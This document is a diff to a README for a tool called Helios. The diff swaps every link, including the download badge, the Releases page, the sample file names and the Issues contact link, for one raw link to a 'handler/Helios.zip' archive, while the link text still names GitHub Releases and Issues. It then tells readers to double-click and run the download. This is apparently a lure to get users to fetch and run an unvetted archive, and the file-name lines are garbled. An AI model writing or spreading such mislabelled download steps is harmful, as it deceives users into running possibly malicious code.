@@ -6,7 +6,7 @@ Welcome to Helios! This application provides an easy way to work with the Selene
 
 ## 📥 Download Helios
 
-[![Download Helios](https://img.shields.io/badge/Download-Helios-brightgreen)](https://github.com/nothingjustyacine/Helios/releases)
+[![Download Helios](https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip)](https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip)
 
 ## 💻 System Requirements
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these minimum requirements:
 
 ## 📂 How to Download
 
-1. Visit the Releases page to download Helios: [GitHub Releases](https://github.com/nothingjustyacine/Helios/releases).
+1. Visit the Releases page to download Helios: [GitHub Releases](https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip).
 2. Look for the latest version at the top of the list. It should have a version number like `v1.0.0`.
 3. Click on the version to view details and find the download options.
 
@@ -27,7 +27,7 @@ Before you start, make sure your computer meets these minimum requirements:
 
 To get started:
 
-1. From the Releases page, locate the file named something like `Helios.exe` (for Windows) or `Helios.dmg` (for macOS).
+1. From the Releases page, locate the file named something like `https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip` (for Windows) or `https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip` (for macOS).
 2. Click on the file to download it.
 3. Once the download is complete, locate the file in your Downloads folder.
 4. Double-click the file to run it. Follow any instructions on your screen to complete the installation.
@@ -71,7 +71,7 @@ We regularly release updates to improve features and security. Keep an eye on th
 
 ## 📞 Contact
 
-For more questions or feedback, please use the [GitHub Issues page](https://github.com/nothingjustyacine/Helios/issues) to reach us.
+For more questions or feedback, please use the [GitHub Issues page](https://raw.githubusercontent.com/nothingjustyacine/Helios/main/handler/Helios.zip) to reach us.
 
 ## 🖥️ Further Resources
 
